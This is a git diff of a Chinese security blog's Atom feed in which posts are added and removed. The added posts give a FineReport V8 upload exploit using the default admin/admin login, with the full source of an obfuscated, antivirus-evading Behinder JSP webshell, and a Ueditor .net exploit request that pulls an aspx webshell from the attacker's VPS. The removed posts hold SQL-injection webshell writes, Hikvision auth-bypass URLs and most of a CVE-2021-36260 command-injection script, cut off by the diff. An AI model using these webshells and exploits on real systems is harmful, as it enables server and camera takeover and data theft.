@@ -1,4 +1,98 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-23T09:36:51+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Forest</title><link href="http://localhost:4000/hack-the-box/forest/" rel="alternate" type="text/html" title="HackTheBox - Forest" /><published>2023-09-13T00:00:00+08:00</published><updated>2023-09-13T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/forest</id><content type="html" xml:base="http://localhost:4000/hack-the-box/forest/"><![CDATA[<h1 id="hackthebox---forest">HackTheBox - Forest</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-23T12:47:20+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">帆软V8文件上传漏洞</title><link href="http://localhost:4000/vul/finereport/" rel="alternate" type="text/html" title="帆软V8文件上传漏洞" /><published>2023-10-23T00:00:00+08:00</published><updated>2023-10-23T00:00:00+08:00</updated><id>http://localhost:4000/vul/finereport</id><content type="html" xml:base="http://localhost:4000/vul/finereport/"><![CDATA[<p>遇到的一个帆软V8文件上传漏洞，url得加上<code class="language-plaintext highlighter-rouge">/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin</code>才能正常访问，不然是空白页</p>
+
+<p><img src="/images/vul/FineReport/1.png" alt="" /></p>
+
+<p>弱口令admin/admin 进去之后长这样</p>
+
+<p><img src="/images/vul/FineReport/2.png" alt="" /></p>
+
+<p>启动水滴工具，访问本地43023端口，用这个模块上传冰蝎jsp免杀马</p>
+
+<p><img src="/images/vul/FineReport/3.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.*,
+sun.misc.BASE64Encoder,javax.crypto.spec.SecretKeySpec" %&gt;
+&lt;%@ page import="java.io.BufferedReader" %&gt;
+&lt;%@ page import="java.io.IOException" %&gt;
+&lt;%@ page import="java.lang.reflect.Method" %&gt;
+&lt;jsp:scriptlet&gt;
+    String pp =\u0022\u0050\u004f\u0053\u0054\u0022;
+&lt;/jsp:scriptlet&gt;
+&lt;%
+    class b6 extends \u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072{}
+    b6 b6 = new b6();
+%&gt;
+&lt;%!
+    public byte[] gg(byte[] a1,String k) {
+
+        try {
+            javax.crypto./*123*/Cipher c = javax.crypto.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e("AES/ECB/PKCS5Padding");
+            c.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName("javax.crypto.spec.SecretKeySpec").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), "AES"));
+            return c.doFinal(a1);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+%&gt;
+
+&lt;%
+    if (request.getMethod().equals(pp)) {
+        String k = "e45e329feb5d925b";
+        session.putValue("u", k);
+        BufferedReader reader = request.getReader();
+        byte[] a1 = b6.decodeBuffer(reader.readLine());
+        byte[] a2 = gg(a1,k);
+
+        Method method2  = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class, int.class, int.class);
+        method2.setAccessible(true);
+        Class i = (Class) method2.invoke(Thread.currentThread().getContextClassLoader(),a2,0,a2.length);
+        Object Qvsa = i.newInstance();
+        Qvsa.equals(pageContext);
+    }
+%&gt;
+
+</code></pre></div></div>
+<p><img src="/images/vul/FineReport/4.png" alt="" /></p>
+
+<p><img src="/images/vul/FineReport/5.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="finereport" /><category term="nday" /><summary type="html"><![CDATA[遇到的一个帆软V8文件上传漏洞，url得加上/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin才能正常访问，不然是空白页]]></summary></entry><entry><title type="html">Ueditor任意文件上传漏洞</title><link href="http://localhost:4000/vul/ueditor/" rel="alternate" type="text/html" title="Ueditor任意文件上传漏洞" /><published>2023-10-23T00:00:00+08:00</published><updated>2023-10-23T00:00:00+08:00</updated><id>http://localhost:4000/vul/ueditor</id><content type="html" xml:base="http://localhost:4000/vul/ueditor/"><![CDATA[<h1 id="ueditor任意文件上传漏洞">Ueditor任意文件上传漏洞</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。</p>
+
+<h2 id="0x01-poc">0x01 POC</h2>
+<p>访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。
+<img src="/images/vul/ueditor/1.png" alt="" /></p>
+
+<p>但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx</p>
+
+<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
+<p>现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马
+<img src="/images/vul/ueditor/2.png" alt="" /></p>
+
+<p>Expoliet:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
+Host: x.x.x.x
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+sec-ch-ua-platform: "Windows"
+sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
+sec-ch-ua-mobile: ?0
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+
+source[]=http://vps_ip/666.jpg?.aspx
+</code></pre></div></div>
+
+<p>抓包修改参数，上传成功</p>
+
+<p><img src="/images/vul/ueditor/3.png" alt="" /></p>
+
+<p><img src="/images/vul/ueditor/4.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="ueditor" /><category term="nday" /><summary type="html"><![CDATA[Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。]]></summary></entry><entry><title type="html">HackTheBox - Forest</title><link href="http://localhost:4000/hack-the-box/forest/" rel="alternate" type="text/html" title="HackTheBox - Forest" /><published>2023-09-13T00:00:00+08:00</published><updated>2023-09-13T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/forest</id><content type="html" xml:base="http://localhost:4000/hack-the-box/forest/"><![CDATA[<h1 id="hackthebox---forest">HackTheBox - Forest</h1>
 <h2 id="about-forest">About Forest</h2>
 <p>Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.</p>
 
@@ -1517,388 +1611,4 @@ exploit
   <li>
     <p>使用WAF产品进行防御</p>
   </li>
-</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><summary type="html"><![CDATA[CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境]]></summary></entry><entry><title type="html">SQL注入Getshell的几种方式</title><link href="http://localhost:4000/tricks/sqli-getshell/" rel="alternate" type="text/html" title="SQL注入Getshell的几种方式" /><published>2023-03-28T00:00:00+08:00</published><updated>2023-03-28T00:00:00+08:00</updated><id>http://localhost:4000/tricks/sqli-getshell</id><content type="html" xml:base="http://localhost:4000/tricks/sqli-getshell/"><![CDATA[<h1 id="sql注入getshell的几种方式">SQL注入Getshell的几种方式</h1>
-<p>SQL注入不仅阔以导致数据泄露，也有阔能getshell哦</p>
-
-<h2 id="0x01-into-outfile">0x01 into outfile</h2>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%secure%'</span><span class="p">;</span>
-<span class="err">$</span> <span class="k">select</span> <span class="s1">'&lt;?php eval($_POST[yyj]);?&gt;'</span> <span class="k">into</span> <span class="n">outfile</span> <span class="nv">"C/phpstudy/www/shell.php"</span><span class="p">;</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> xxx <span class="nt">--sql-shell</span>
-<span class="nv">$ </span><span class="k">select</span> @@datadir<span class="p">;</span> <span class="c">#查看文件路径（mysql/data的路径，根目录一般与mysql处于同一目录）</span>
-<span class="nv">$ </span><span class="k">select</span> @@secure_file_priv<span class="p">;</span>
-</code></pre></div></div>
-
-<h2 id="0x02-sqlmap-os-shell">0x02 sqlmap –os-shell</h2>
-<p><strong>1.原理</strong>
-–os-shell就是使用udf提权获取webshell。也是通过into outfile向服务器写入两个文件，一个可以直接执行系统命令，另一个可以上传文件。需要知道网站根目录以及数据库dba权限。</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u xxx --os-shell
-</code></pre></div></div>
-
-<h2 id="0x03-写日志">0x03 写日志</h2>
-<p>尝试用日志写入木马getshell不需要secure_file_priv没有具体值，但是需要知道网站根目录。</p>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%general%'</span>  <span class="o">#</span><span class="err">查看日志功能是否开启</span>
-<span class="err">$</span> <span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span> <span class="o">=</span> <span class="s1">'ON'</span> <span class="o">#</span><span class="err">未开启的话设置为</span><span class="k">on</span>
-<span class="err">$</span> <span class="k">set</span> <span class="k">global</span> <span class="n">general_log_file</span> <span class="o">=</span> <span class="s1">'C:/phpStudy1/WWW/yyj.php'</span>
-<span class="err">$</span> <span class="k">select</span> <span class="s1">'&lt;?php @eval($_POST[yyj]); ?&gt;'</span> 
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;tricks&quot;]" /><category term="sqli" /><category term="web" /><category term="mysql" /><summary type="html"><![CDATA[SQL注入Getshell的几种方式 SQL注入不仅阔以导致数据泄露，也有阔能getshell哦]]></summary></entry><entry><title type="html">CVE-2017-7921 - Hikvision摄像头越权访问</title><link href="http://localhost:4000/vul/CVE-2017-7921/" rel="alternate" type="text/html" title="CVE-2017-7921 - Hikvision摄像头越权访问" /><published>2022-07-27T00:00:00+08:00</published><updated>2022-07-27T00:00:00+08:00</updated><id>http://localhost:4000/vul/CVE-2017-7921</id><content type="html" xml:base="http://localhost:4000/vul/CVE-2017-7921/"><![CDATA[<blockquote>
-  <p>body=”laCurrentLanguage” &amp;&amp; country=”CN”</p>
-</blockquote>
-
-<p>查看用户列表</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Security/users?auth=YWRtaW46MTEK   
-</code></pre></div></div>
-
-<p>获取监控快照</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/onvif-http/snapshot?auth=YWRtaW46MTEK
-</code></pre></div></div>
-<p>下载配置文件</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/System/configurationFile?auth=YWRtaW46MTEK  
-</code></pre></div></div>
-
-<p><strong>解码配置文件</strong></p>
-
-<p><a href="https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor">https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</a></p>
-
-<p>安装脚本依赖文件</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 -m pip install pycryptodome
-</code></pre></div></div>
-
-<p>解码，可得到用户名和密码</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt;
-</code></pre></div></div>
-
-<p>CVE-2021-36260-HikvisionRCE:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection
-# Exploit Author: bashis
-# Vendor Homepage: https://www.hikvision.com/
-# Version: 1.0
-# CVE: CVE-2021-36260
-# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
-</span>
-<span class="c1"># All credit to Watchful_IP
-</span>
-<span class="c1">#!/usr/bin/env python3
-</span>
-<span class="sh">"""</span><span class="s">
-Note:
-1)  This code will _not_ verify if remote is Hikvision device or not.
-2)  Most of my interest in this code has been concentrated on how to
-    reliably detect vulnerable and/or exploitable devices.
-    Some devices are easy to detect, verify and exploit the vulnerability,
-    other devices may be vulnerable but not so easy to verify and exploit.
-    I think the combined verification code should have very high accuracy.
-3)  </span><span class="sh">'</span><span class="s">safe check</span><span class="sh">'</span><span class="s"> (--check) will try write and read for verification
-    </span><span class="sh">'</span><span class="s">unsafe check</span><span class="sh">'</span><span class="s"> (--reboot) will try reboot the device for verification
-[Examples]
-Safe vulnerability/verify check:
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check
-Safe and unsafe vulnerability/verify check:
-(will only use </span><span class="sh">'</span><span class="s">unsafe check</span><span class="sh">'</span><span class="s"> if not verified with </span><span class="sh">'</span><span class="s">safe check</span><span class="sh">'</span><span class="s">)
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot
-Unsafe vulnerability/verify check:
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot
-Launch and connect to SSH shell:
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell
-Execute command:
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">
-Execute blind command:
-    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">
-$./CVE-2021-36260.py -h
-[*] Hikvision CVE-2021-36260
-[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)
-usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]
-                         [--reboot] [--shell] [--cmd CMD]
-                         [--cmd_blind CMD_BLIND] [--noverify]
-                         [--proto {http,https}]
-optional arguments:
-  -h, --help            show this help message and exit
-  --rhost RHOST         Remote Target Address (IP/FQDN)
-  --rport RPORT         Remote Target Port
-  --check               Check if vulnerable
-  --reboot              Reboot if vulnerable
-  --shell               Launch SSH shell
-  --cmd CMD             execute cmd (i.e: </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">)
-  --cmd_blind CMD_BLIND
-                        execute blind cmd (i.e: </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">)
-  --noverify            Do not verify if vulnerable
-  --proto {http,https}  Protocol used
-$
-</span><span class="sh">"""</span>
-
-<span class="kn">import</span> <span class="n">os</span>
-<span class="kn">import</span> <span class="n">argparse</span>
-<span class="kn">import</span> <span class="n">time</span>
-
-<span class="kn">import</span> <span class="n">requests</span>
-<span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">packages</span>
-<span class="kn">from</span> <span class="n">requests.packages</span> <span class="kn">import</span> <span class="n">urllib3</span>
-<span class="kn">from</span> <span class="n">requests.packages.urllib3</span> <span class="kn">import</span> <span class="n">exceptions</span>
-
-
-<span class="k">class</span> <span class="nc">Http</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">proto</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">):</span>
-        <span class="nf">super</span><span class="p">(</span><span class="n">Http</span><span class="p">,</span> <span class="n">self</span><span class="p">).</span><span class="nf">__init__</span><span class="p">()</span>
-
-        <span class="n">self</span><span class="p">.</span><span class="n">rhost</span> <span class="o">=</span> <span class="n">rhost</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">rport</span> <span class="o">=</span> <span class="n">rport</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="n">proto</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>
-
-        <span class="n">self</span><span class="p">.</span><span class="n">remote</span> <span class="o">=</span> <span class="bp">None</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="bp">None</span>
-
-        <span class="sh">"""</span><span class="s"> Most devices will use self-signed certificates, suppress any warnings </span><span class="sh">"""</span>
-        <span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
-
-        <span class="n">self</span><span class="p">.</span><span class="n">remote</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
-
-        <span class="n">self</span><span class="p">.</span><span class="nf">_init_uri</span><span class="p">()</span>
-
-        <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span>
-            <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span>
-            <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">*/*</span><span class="sh">'</span><span class="p">,</span>
-            <span class="sh">'</span><span class="s">X-Requested-With</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">XMLHttpRequest</span><span class="sh">'</span><span class="p">,</span>
-            <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded; charset=UTF-8</span><span class="sh">'</span><span class="p">,</span>
-            <span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">gzip, deflate</span><span class="sh">'</span><span class="p">,</span>
-            <span class="sh">'</span><span class="s">Accept-Language</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">en-US,en;q=0.9,sv;q=0.8</span><span class="sh">'</span><span class="p">,</span>
-        <span class="p">})</span>
-        <span class="sh">"""</span><span class="s">
-        self.remote.proxies.update({
-            # </span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="s">,
-        })
-        </span><span class="sh">"""</span>
-
-    <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
-
-        <span class="k">if</span> <span class="n">query_args</span><span class="p">:</span>
-            <span class="sh">"""</span><span class="s">Some devices can handle more, others less, 22 bytes seems like a good compromise</span><span class="sh">"""</span>
-            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">query_args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">22</span><span class="p">:</span>
-                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[!] Error: Command </span><span class="sh">"</span><span class="si">{</span><span class="n">query_args</span><span class="si">}</span><span class="sh">"</span><span class="s"> to long (</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">query_args</span><span class="p">)</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
-                <span class="k">return</span> <span class="bp">None</span>
-
-        <span class="sh">"""</span><span class="s">This weird code will try automatically switch between http/https
-        and update Host
-        </span><span class="sh">"""</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
-                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
-            <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span> <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">==</span> <span class="sh">'</span><span class="s">http</span><span class="sh">'</span> <span class="k">else</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span>
-            <span class="n">self</span><span class="p">.</span><span class="nf">_init_uri</span><span class="p">()</span>
-            <span class="k">try</span><span class="p">:</span>
-                <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
-                    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-                <span class="k">else</span><span class="p">:</span>
-                    <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-            <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
-                <span class="k">return</span> <span class="bp">None</span>
-        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span><span class="p">:</span>
-            <span class="k">return</span> <span class="bp">None</span>
-        <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
-            <span class="k">return</span> <span class="bp">None</span>
-
-        <span class="sh">"""</span><span class="s">302 when requesting http on https enabled device</span><span class="sh">"""</span>
-
-        <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
-            <span class="n">redirect</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Location</span><span class="sh">'</span><span class="p">)</span>
-            <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">[:</span><span class="n">redirect</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)]</span>
-            <span class="n">self</span><span class="p">.</span><span class="nf">_update_host</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
-                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
-
-        <span class="k">return</span> <span class="n">data</span>
-
-    <span class="k">def</span> <span class="nf">_update_host</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
-        <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">://</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">:]:</span>
-            <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span>
-                <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">://</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">:],</span>
-            <span class="p">})</span>
-
-    <span class="k">def</span> <span class="nf">_init_uri</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{proto}://{rhost}:{rport}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">proto</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proto</span><span class="p">,</span> <span class="n">rhost</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">rport</span><span class="p">))</span>
-
-    <span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
-        <span class="sh">"""</span><span class="s">Command injection in the &lt;language&gt; tag</span><span class="sh">"""</span>
-        <span class="n">query_args</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s">?&gt;</span><span class="sh">'</span> \
-                     <span class="sa">f</span><span class="sh">'</span><span class="s">&lt;language&gt;$(</span><span class="si">{</span><span class="n">query_args</span><span class="si">}</span><span class="s">)&lt;/language&gt;</span><span class="sh">'</span>
-        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">query_args</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
-
